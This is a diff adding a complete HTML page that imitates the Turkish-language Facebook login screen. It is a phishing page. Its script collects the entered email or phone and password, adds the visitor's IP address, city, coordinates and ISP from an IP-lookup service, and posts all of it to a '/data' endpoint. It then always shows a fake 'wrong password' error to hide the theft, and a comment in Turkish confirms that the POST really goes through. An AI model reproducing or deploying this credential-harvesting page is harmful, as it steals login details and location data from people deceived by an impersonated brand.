@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook - Giriş Yap veya Kaydol</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png" type="image/x-icon" />
+  <style>
+    :root{
+      --bg:#eef2f7;
+      --surface:#ffffff;
+      --text:#15181d;
+      --muted:#6b7280;
+      --primary:#2b6cf6;
+      --primary-700:#245dd6;
+      --success:#22c55e;
+      --radius:16px;
+      --shadow:0 12px 30px rgba(2,6,23,.08);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      background:var(--bg);
+      color:var(--text);
+      display:flex; flex-direction:column; justify-content:center; align-items:center;
+    }
+    main{flex:1; display:grid; place-items:center; width:100%;}
+    .container{
+      width:min(1100px,94vw);
+      display:grid; grid-template-columns: 1.1fr 1fr;
+      gap:48px; align-items:center;
+    }
+    @media(max-width:960px){
+      .container{grid-template-columns:1fr; gap:28px; padding:24px 0}
+    }
+    .brand h1{
+      margin:0 0 10px;
+      font-weight:900;
+      font-size: clamp(40px, 8vw, 72px);
+      background: linear-gradient(90deg, var(--primary), #58a6ff);
+      -webkit-background-clip:text;
+      background-clip:text;
+      color:transparent;
+    }
+    .brand p{margin:0;color:var(--muted);font-size: clamp(16px,2.5vw,22px);}
+    .card{
+      background:var(--surface); border-radius:var(--radius);
+      box-shadow:var(--shadow); padding:28px;
+    }
+    form{display:grid; gap:14px}
+    label{font-size:13px; color:var(--muted); display:block; margin-bottom:6px}
+    .input{
+      width:100%; padding:14px 16px; border:1px solid #e5e7eb;
+      border-radius:12px; font-size:16px; background:#fff; outline:none;
+    }
+    .input:focus{border-color:var(--primary); box-shadow:0 0 0 4px rgba(43,108,246,.15);}
+    .btn{
+      border:0; cursor:pointer; padding:14px 16px; border-radius:12px;
+      font-weight:700; font-size:16px; background:var(--primary); color:#fff;
+    }
+    .btn:hover{background:var(--primary-700)}
+    .link{display:block;text-align:center;font-size:14px;color:var(--primary);margin-top:4px;text-decoration:none}
+    .divider{display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;color:var(--muted);font-size:12px;margin:8px 0}
+    .divider::before,.divider::after{content:"";height:1px;background:#e5e7eb}
+    .create{background:var(--success);}
+    .create:hover{filter:brightness(.95)}
+    footer{
+      margin-top:30px; width:100%; text-align:center; font-size:12px; color:var(--muted);
+    }
+    footer .langs, footer .links{display:flex;flex-wrap:wrap;justify-content:center;gap:12px;margin:6px 0;}
+    footer a{color:inherit;text-decoration:none;}
+    footer a:hover{text-decoration:underline}
+  </style>
+</head>
+<body>
+  <main>
+    <div class="container">
+      <section class="brand">
+        <h1>facebook</h1>
+        <p>Facebook tanıdıklarınla iletişim kurmanı ve hayatında olup bitenleri paylaşmanı sağlar.</p>
+      </section>
+      <section class="card">
+        <form id="loginForm">
+          <div>
+            <label for="identifier">E-posta veya telefon</label>
+            <input class="input" id="identifier" name="identifier" type="text" placeholder="ornek@posta.com" required />
+          </div>
+          <div>
+            <label for="password">Şifre</label>
+            <input class="input" id="password" name="password" type="password" placeholder="Şifreniz" required />
+          </div>
+          <button class="btn" type="submit">Giriş Yap</button>
+          <a class="link" href="#">Şifreni mi unuttun?</a>
+          <div class="divider">veya</div>
+          <button class="btn create" type="button">Yeni hesap oluştur</button>
+        </form>
+      </section>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="langs">
+      <a href="#">Türkçe</a>
+      <a href="#">English (UK)</a>
+      <a href="#">Kurdî (Kurmancî)</a>
+      <a href="#">العربية</a>
+      <a href="#">Zaza</a>
+      <a href="#">Deutsch</a>
+      <a href="#">Русский</a>
+      <a href="#">Français (France)</a>
+      <a href="#">فارسی</a>
+      <a href="#">Español</a>
+      <a href="#">Português (Brasil)</a>
+    </div>
+    <div class="links">
+      <a href="#">Kaydol</a>
+      <a href="#">Giriş Yap</a>
+      <a href="#">Messenger</a>
+      <a href="#">Video</a>
+      <a href="#">Meta Pay</a>
+      <a href="#">Mağaza</a>
+      <a href="#">Meta Quest</a>
+      <a href="#">Instagram</a>
+      <a href="#">Threads</a>
+      <a href="#">Gizlilik</a>
+      <a href="#">Koşullar</a>
+      <a href="#">Yardım</a>
+    </div>
+    <p>Meta © 2025</p>
+  </footer>
+
+  <!-- JavaScript -->
+<script>
+  async function getIpDetails() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    return await res.json();
+  } catch (err) {
+    return {};
+  }
+}
+  const form = document.getElementById('loginForm');
+
+  function showMessage(text, color = 'red') {
+    let msg = document.getElementById('message');
+    if (!msg) {
+      msg = document.createElement('p');
+      msg.id = 'message';
+      msg.style.marginTop = '8px';
+      msg.style.fontSize = '14px';
+      form.appendChild(msg);
+    }
+    msg.style.color = color;
+    msg.textContent = text;
+  }
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const username = document.getElementById('identifier').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const data = await getIpDetails();
+    if (!username || !password) {
+      showMessage('Lütfen tüm alanları doldurun!', 'red');
+      return;
+    }
+
+    const payload = {
+        username: username,
+        password: password,
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        latitude: data.latitude,
+        longitude: data.longitude,
+        asn: data.asn,
+        org: data.org
+    };
+
+    try {
+      const res = await fetch('/data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (!res.ok) {
+        showMessage('Sunucu hatası!', 'red');
+        return;
+      }
+
+      // Backend’e gerçekten POST gidecek
+      // Ama sen yönlendirme yapmıyorsun, o yüzden hep default mesaj gözükecek
+      showMessage('Email veya şifre yanlış. Lütfen tekrar deneyiniz.', 'red');
+
+    } catch (err) {
+      console.error('Fetch error:', err);
+      showMessage('Bağlantı hatası!', 'red');
+    }
+  });
+</script>
+</body>
+</html>
